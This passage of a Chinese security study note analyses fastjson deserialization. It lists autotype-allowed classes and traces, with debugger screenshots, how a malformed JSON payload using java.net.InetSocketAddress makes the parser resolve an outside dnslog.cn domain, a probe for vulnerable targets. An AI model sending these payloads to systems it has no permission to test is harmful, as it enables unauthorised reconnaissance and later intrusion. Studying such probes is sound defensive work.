java.util.concurrent.TimeUnit
boolean
java.lang.InstantiationError
java.lang.InterruptedException
[float

java.util.regex.Pattern
com.alibaba.fastjson.JSONArray
java.lang.StringBuilder
java.nio.charset.Charset
java.math.BigDecimal
char
java.io.File
java.lang.String
boolean
java.net.InetSocketAddress
java.lang.Character
java.lang.Number
java.util.concurrent.ConcurrentHashMap
javax.xml.datatype.XMLGregorianCalendar
java.net.Inet4Address
java.sql.Date
java.util.Collection
com.alibaba.fastjson.JSONPath
java.util.concurrent.atomic.AtomicIntegerArray
java.util.TreeMap
short
java.util.Currency
java.sql.Time
java.lang.Integer
double
java.lang.Class
java.math.BigInteger
com.alibaba.fastjson.JSONObject
java.util.concurrent.atomic.AtomicBoolean
java.util.concurrent.atomic.AtomicLongArray
java.util.HashMap
java.util.TimeZone
java.lang.Comparable
java.util.ArrayList
java.text.SimpleDateFormat
com.alibaba.fastjson.JSONPObject
java.lang.StringBuffer
byte
java.io.Closeable
java.lang.Double
java.util.concurrent.atomic.AtomicInteger
int
java.lang.Float
java.net.URL
java.util.List
java.lang.Object
java.sql.Timestamp
java.lang.StackTraceElement
java.net.Inet6Address
java.util.concurrent.atomic.AtomicLong
java.net.URI
java.util.UUID
java.lang.Cloneable
java.util.LinkedHashMap
long
java.lang.Short
java.lang.Byte
[C
java.lang.ref.WeakReference
java.lang.ref.SoftReference
java.util.concurrent.ConcurrentMap
java.util.Calendar
java.util.Date
java.util.Locale
java.lang.Long
java.util.Map
java.io.Serializable
java.util.concurrent.atomic.AtomicReference
java.lang.Boolean
float
</code></pre>
<h2 id="&#x6316;&#x6398;"><a name="&#x6316;&#x6398;" class="anchor-navigation-ex-anchor" href="#&#x6316;&#x6398;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x6316;&#x6398;</h2>
<p>&#x65E2;&#x7136;&#x5DF2;&#x7ECF;&#x62FF;&#x5230;&#x8FD9;&#x4E9B;&#x7C7B;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x7B5B;&#x9009;&#x4E00;&#x4E0B;&#x54EA;&#x4E9B;&#x662F;&#x53EF;&#x4EE5;&#x7528;&#x7684;&#xFF08;&#x8FD9;&#x91CC;&#x7B5B;&#x9009;&#x7684;&#x662F;<code>java.net.xxx</code>&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5E26;net&#x7684;&#x51E0;&#x4E4E;&#x90FD;&#x548C;&#x7F51;&#x7EDC;&#x76F8;&#x5173;&#x53EF;&#x4EE5;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF09;</p>
<pre><code class="lang-class">java.net.InetSocketAddress
java.net.Inet4Address
java.net.URL
java.net.Inet6Address
java.net.URI
</code></pre>
<p>&#x90A3;&#x6211;&#x4EEC;&#x4ECE;&#x7B2C;&#x4E00;&#x4E2A;&#x5F00;&#x59CB;</p>
<h3 id="javanetinetsocketaddress"><a name="javanetinetsocketaddress" class="anchor-navigation-ex-anchor" href="#javanetinetsocketaddress"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.1. java.net.InetSocketAddress</h3>
<p>&#x521D;&#x59CB;payload</p>
<pre><code class="lang-java">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x901A;&#x8FC7;<code>checkAutoType</code>&#x540E;&#xFF0C;&#x6210;&#x529F;&#x6309;&#x7167;&#x6211;&#x4EEC;&#x7684;&#x9884;&#x671F;&#x8FD4;&#x56DE;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020113548087.png" data-lightbox="e1f94645-4ed7-4287-8c53-2f1dcaa5b84a" data-title="image-20211020113548087"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020113548087.png" alt="image-20211020113548087"></a></p>
<p>&#x7136;&#x540E;&#x8DDF;&#x5230;371&#x884C;&#xFF0C;&#x6267;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x7EB5;&#xFF0C;&#x8DF3;&#x8FC7;&#x8FD9;&#x4E00;&#x6B65;&#x4F1A;&#x76F4;&#x63A5;&#x629B;&#x51FA;&#x9519;&#x8BEF;&#x5F02;&#x5E38;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020113705784.png" data-lightbox="b6d6593a-0258-4318-bd99-67e85324353f" data-title="image-20211020113705784"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020113705784.png" alt="image-20211020113705784"></a></p>
<p>&#x8DDF;&#x8FDB;&#x540E;&#xFF0C;&#x5224;&#x65AD;&#x7C7B;&#xFF0C;&#x901A;&#x8FC7;</p>
<p>&#x5F00;&#x59CB;&#x5224;&#x65AD;token&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x7684;token&#x662F;16&#xFF0C;&#x5373;<code>,</code>&#xFF0C;&#x4E0D;&#x7B49;&#x4E8E;8&#xFF0C;&#x8FDB;&#x5165;else</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020115303924.png" data-lightbox="b3aac9ba-4d84-425f-bdb6-b7a46e3ad465" data-title="image-20211020115303924"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020115303924.png" alt="image-20211020115303924"></a></p>
<p>&#x6765;&#x5230;&#x4E86;<code>parser.accept(token)</code>&#x540E;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5E72;&#x5565;&#x7684;&#xFF0C;&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x539F;&#x6765;&#x662F;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x7684;token&#x662F;&#x4E0D;&#x662F;&#x4F20;&#x5165;&#x7684;token&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x662F;16&#x4E0D;&#x662F;12&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020115605034.png" data-lightbox="d448f864-e9fa-4cdc-9eb1-bc500c3d6d88" data-title="image-20211020115605034"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020115605034.png" alt="image-20211020115605034"></a></p>
<p>&#x90A3;&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;payload&#xFF0C;&#x7ED9;&#x4ED6;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A; <code>{</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;token=12</p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>{, <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x6210;&#x529F;&#x901A;&#x8FC7;<code>accept</code>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x4E86;&#xFF0C;&#x7EE7;&#x7EED;&#x5411;&#x4E0B;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020125639330.png" data-lightbox="b91cd104-ab14-4993-abf7-7af90aa52f35" data-title="image-20211020125639330"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020125639330.png" alt="image-20211020125639330"></a></p>
<p>&#x53D1;&#x73B0;&#x6709;&#x4E2A;&#x53D8;&#x91CF;<code>className</code>&#xFF0C;&#x4E0B;&#x65B9;&#x8981;&#x6C42;&#x4ED6;&#x7B49;&#x4E8E;<code>address</code>&#xFF0C;&#x4E14;&#x671F;&#x671B;&#x5B83;&#x4E0B;&#x4E00;&#x4F4D;&#x7684;token&#x662F;17&#xFF08;<code>:</code>&#xFF09;</p>
<p>&#x90A3;&#x6211;&#x4EEC;&#x770B;&#x770B;<code>className</code>&#x662F;&#x600E;&#x4E48;&#x5F97;&#x6765;&#x7684;&#xFF0C;&#x8DDF;&#x8FDB;<code>stringVal</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020130700387.png" data-lightbox="611d29bf-5ee1-4e36-8fd2-f8cb936a4dbd" data-title="image-20211020130700387"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020130700387.png" alt="image-20211020130700387"></a></p>
<p>&#x53D1;&#x73B0;&#x8FD9;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x5207;&#x5272;&#x51FD;&#x6570;&#xFF0C;<code>this</code>&#x4E3A;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x56E0;&#x4E3A;<code>this.hasSpecial</code>&#x4E3A;false</p>
<p><code>this.np</code>&#x5C31;&#x662F;&#x5F53;&#x524D;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x73B0;&#x5728;&#x7684;&#x6E38;&#x6807;&#x4F4D;&#x7F6E;&#xFF0C;&#x800C;<code>this.sp</code>&#x5219;&#x662F;&#x5207;&#x5272;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x6211;&#x4EEC;&#x518D;&#x770B;&#x4E0B;&#x8FD9;&#x4E2A;<code>this.sp</code>&#x662F;&#x600E;&#x4E48;&#x53D8;&#x5F97;</p>
<p>&#x524D;&#x671F;&#x9636;&#x6BB5;&#xFF0C;&#x662F;&#x7EDF;&#x8BA1;2&#x4E2A;<code>&quot;</code>&#x4E2D;&#x95F4;&#x7684;&#x957F;&#x5EA6;&#x7684;&#xFF0C;&#x65B9;&#x4FBF;&#x540E;&#x9762;&#x5207;&#x5272;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020132352930.png" data-lightbox="ccfe7de3-5fb4-4488-9bcb-27d14b517ba4" data-title="image-20211020132352930"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020132352930.png" alt="image-20211020132352930"></a></p>
<p>&#x540E;&#x9762;&#x4F30;&#x8BA1;&#x4E5F;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53D1;&#x73B0;&#x5728;&#x8FDB;&#x5165;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x540E;&#xFF0C;<code>paper.accept</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>nextToken</code>&#xFF0C;&#x5176;&#x4E2D;&#x4F1A;&#x7528;&#x5230;<code>this.sp</code></p>
<p>&#x8DDF;&#x4E00;&#x4E0B;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x5C31;&#x662F;&#x6211;&#x4EEC;payload&#x4E2D;<code>{</code>&#x540E;&#x9762;&#x7684;<code>,</code>&#xFF0C;&#x671F;&#x671B;&#x4E00;&#x4E2A;<code>&quot;</code>&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x662F;<code>,</code>&#xFF0C;&#x6240;&#x4EE5;<code>this.sp</code>&#x5C31;&#x7B49;&#x4E8E;0&#x4E86;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020132817095.png" data-lightbox="67581e11-00c5-41b5-a803-55ffc812bd31" data-title="image-20211020132817095"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020132817095.png" alt="image-20211020132817095"></a></p>
<p>&#x6240;&#x4EE5;&#x8FD8;&#x9700;&#x8981;&#x589E;&#x52A0;&#x4E00;&#x5BF9;<code>&quot;</code>&#xFF0C;&#x6765;&#x589E;&#x52A0;<code>this.sp</code>&#x7684;&#x503C;&#xFF0C;&#x8FBE;&#x5230;&#x5207;&#x5272;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x76EE;&#x7684;</p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>{<span class="hljs-string">&quot;aaa&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x66F4;&#x6362;<code>payload</code>&#x540E;&#xFF0C;&#x6210;&#x529F;&#x901A;&#x8FC7;&#x4E0A;&#x65B9;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x8FDB;&#x5165;<code>this.scanString()</code>&#xFF0C;&#x8FD9;&#x91CC;&#x9762;<code>this.sp++</code>&#x4F1A;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020133230515.png" data-lightbox="c4d31185-a003-4199-9c49-c3e14a691c96" data-title="image-20211020133230515"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020133230515.png" alt="image-20211020133230515"></a></p>
<p>&#x6B64;&#x65F6;<code>this.sp</code>&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x7EE7;&#x7EED;&#x56DE;&#x5230;<code>lexer.stringVal()</code>&#xFF0C;&#x8DDF;&#x8FDB;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x73B0;&#x5728;&#x5207;&#x5272;&#x51FA;&#x6765;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>aaa</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020133708694.png" data-lightbox="8c9a28c2-df23-477a-83e7-7eb1bce18efa" data-title="image-20211020133708694"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020133708694.png" alt="image-20211020133708694"></a></p>
<p>&#x7EE7;&#x7EED;&#x5F80;&#x540E;&#xFF0C;&#x53D1;&#x73B0;<code>className</code>&#x8981;&#x7B49;&#x4E8E;<code>address</code>&#xFF0C;&#x6240;&#x4EE5;&#x7ED9;&#x6211;&#x4EEC;&#x7684;<code>aaa</code>&#x6539;&#x6210;<code>address</code>&#x5373;&#x53EF;&#xFF0C;&#x6B64;&#x5916;&#x671F;&#x671B;<code>token</code>&#x662F;17&#xFF0C;&#x90A3;&#x8FD8;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A;<code>:</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020134003797.png" data-lightbox="e7b90c77-fa4a-4d91-8f9b-2e439a4259a6" data-title="image-20211020134003797"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020134003797.png" alt="image-20211020134003797"></a></p>
<p>&#x6240;&#x4EE5;&#x4FEE;&#x6539;&#x540E;&#x7684;payload</p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>{<span class="hljs-string">&quot;address&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x4E00;&#x8DEF;&#x987A;&#x5229;&#xFF0C;&#x5230;&#x4E86;<code>parser.parseObject</code>&#x8FD9;&#x91CC;&#x4F1A;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x4E3A;<code>InetAddress</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140108291.png" data-lightbox="de9610f0-f661-4e8c-8b47-1de69d3c24e8" data-title="image-20211020140108291"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140108291.png" alt="image-20211020140108291"></a></p>
<p>&#x53C8;&#x662F;&#x4E00;&#x8DEF;&#x987A;&#x5229;&#xFF0C;&#x5230;&#x4E86;<code>deserializer.deserialze</code>,&#x53EA;&#x4E0D;&#x8FC7;&#x8FD9;&#x6B21;&#x4F20;&#x5165;&#x7684;<code>Type</code>&#x662F;<code>InetAddress</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140434108.png" data-lightbox="4bd20082-63d3-4b57-a64d-07f7b8ccc3bd" data-title="image-20211020140434108"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140434108.png" alt="image-20211020140434108"></a></p>
<p>&#x53C8;&#x56DE;&#x5230;&#x4E86;&#x719F;&#x6089;&#x7684;&#x5730;&#x65B9;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140815933.png" data-lightbox="211c87cd-79ca-4d91-b908-53f1c5d37a0f" data-title="image-20211020140815933"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140815933.png" alt="image-20211020140815933"></a></p>
<p>&#x7136;&#x540E;&#x4E00;&#x987F;&#x8C03;&#xFF0C;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x4E86;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140920982.png" data-lightbox="3d2c53d2-a8e3-4876-8212-6ff1c7eb71f9" data-title="image-20211020140920982"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140920982.png" alt="image-20211020140920982"></a></p>
<p>&#x56DE;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x539F;&#x6765;&#x662F;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x8981;&#x6C42;&#x662F;16&#xFF08;<code>:</code>&#xFF09;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x662F;4&#xFF08;<code>String</code>&#xFF09;&#x3002;&#x3002;&#x3002;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140935775.png" data-lightbox="223cf279-2236-4913-88fb-fbfdd61b4746" data-title="image-20211020140935775"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020140935775.png" alt="image-20211020140935775"></a></p>
<p>&#x90A3;&#x54EA;&#x4E2A;&#x5730;&#x65B9;&#x7684;<code>String</code>&#x51FA;&#x95EE;&#x9898;&#x4E86;&#x5462;&#xFF1F;</p>
<p>&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x5F53;&#x524D;&#x6E38;&#x6807;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x53D1;&#x73B0;&#x5C31;&#x662F;<code>&quot;address&quot;:</code>&#x540E;&#x9762;&#x5E94;&#x8BE5;&#x662F;&#x4E2A;<code>,</code>&#xFF0C;&#x800C;&#x4E0D;&#x662F;<code>String</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020142110988.png" data-lightbox="cd6eacd8-8fe8-48b9-982c-c971f7fe2c4c" data-title="image-20211020142110988"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020142110988.png" alt="image-20211020142110988"></a></p>
<p>&#x6240;&#x4EE5;&#x518D;&#x6539;<code>payload</code></p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>{<span class="hljs-string">&quot;address&quot;</span>:, <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x53C8;&#x56DE;&#x5230;&#x521A;&#x624D;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x8FD9;&#x6B21;&#x8FC7;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x6C42;<code>lexer.stringVal()</code>&#x4E3A;<code>val</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020145424215.png" data-lightbox="436a2303-4dbb-4d4d-8528-708f69a5cf09" data-title="image-20211020145424215"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020145424215.png" alt="image-20211020145424215"></a></p>
<p>&#x719F;&#x6089;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x521A;&#x624D;&#x6211;&#x4EEC;&#x5206;&#x6790;&#x8FC7;&#x4E86;&#xFF0C;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4E00;&#x4E2A;<code>&quot;xxx&quot;</code>&#xFF0C;&#x4ECE;&#x4E0A;&#x9762;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6765;<code>&quot;a&quot;</code>&#x662F;&#x6211;&#x4EEC;&#x540E;&#x9762;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x4E2D;&#x7684;&#x952E;</p>
<p>&#x90A3;&#x6211;&#x4EEC;&#x7ED9;<code>a</code>&#x6539;&#x6210;<code>val</code></p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>{<span class="hljs-string">&quot;address&quot;</span>:, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x7136;&#x540E;&#x56DE;&#x5230;&#x521A;&#x624D;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x7EE7;&#x7EED;&#x5411;&#x540E;&#xFF0C;&#x90FD;&#x662F;&#x6EE1;&#x8DB3;&#x7684;&#xFF0C;&#x6211;&#x4EEC;payload&#x4E2D;<code>val</code>&#x7684;&#x503C;&#x8D4B;&#x7ED9;&#x4E86;<code>objVal</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020145922718.png" data-lightbox="4acb7767-9681-473e-afd1-c696364f7459" data-title="image-20211020145922718"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020145922718.png" alt="image-20211020145922718"></a></p>
<p>&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#xFF0C;&#x8D4B;&#x503C;&#x7ED9;<code>strVal</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150347710.png" data-lightbox="4343412c-09fe-4cf7-a34c-4c1fd89313dc" data-title="image-20211020150347710"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150347710.png" alt="image-20211020150347710"></a></p>
<p>&#x8FD4;&#x56DE;<code>InetAddress.getByName(strVal)</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150437942.png" data-lightbox="6777e2b7-043b-427b-aa87-3b0997f6539e" data-title="image-20211020150437942"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150437942.png" alt="image-20211020150437942"></a></p>
<p>&#x800C;<code>InetAddress.getByName</code>&#x4F1A;&#x5C1D;&#x8BD5;&#x901A;&#x8FC7;&#x57DF;&#x540D;&#x83B7;&#x53D6;IP</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150623023.png" data-lightbox="a9d3405b-92a7-40e2-a48a-61081843c209" data-title="image-20211020150623023"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150623023.png" alt="image-20211020150623023"></a></p>
<p>&#x6240;&#x4EE5;&#x7ED9;<code>strVal</code>&#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;<code>dnslog</code>&#x7684;URL&#x5373;&#x53EF;</p>
<p>&#x6700;&#x7EC8;Payload</p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>{<span class="hljs-string">&quot;address&quot;</span>:, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;enst5r.dnslog.cn&quot;</span>}
</code></pre>
<p>&#x6210;&#x529F;</p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150909237.png" data-lightbox="400ab24e-9ca7-4dfc-b6c4-80d60b68da13" data-title="image-20211020150909237"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020150909237.png" alt="image-20211020150909237"></a></p>
<blockquote>
<p>&#x6700;&#x540E;&#x5C0F;&#x5C0F;&#x7684;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#xFF1A;&#x5C31;&#x662F;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x7F3A;&#x4EC0;&#x4E48;&#x7ED9;&#x4ED6;&#x8865;&#x4EC0;&#x4E48;</p>
</blockquote>
<h3 id="javanetinet4address"><a name="javanetinet4address" class="anchor-navigation-ex-anchor" href="#javanetinet4address"><i class="fa fa-link" aria-hidden="true"></i></a>1.4.2. java.net.Inet4Address</h3>
<p>&#x521D;&#x59CB;<code>payload</code></p>
<pre><code class="lang-json">{<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>}
</code></pre>
<p>&#x8FD0;&#x884C;&#xFF0C;&#x7ECF;&#x8FC7;<code>checkAutoType</code>&#x540E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x548C;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#x7684;&#x9519;&#xFF0C;&#x9700;&#x8981;<code>val</code>&#xFF0C;&#x800C;&#x6B64;&#x65F6;&#x7684;&#x503C;&#x662F;<code>a</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020151339285.png" data-lightbox="47b83507-33a3-407c-9166-fe0ad7ef21a3" data-title="image-20211020151339285"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020151339285.png" alt="image-20211020151339285"></a></p>
<p>&#x6211;&#x4EEC;&#x7ED9;<code>a</code>&#x6362;&#x6210;<code>val</code>&#x5C31;&#x884C;&#x4E86;</p>
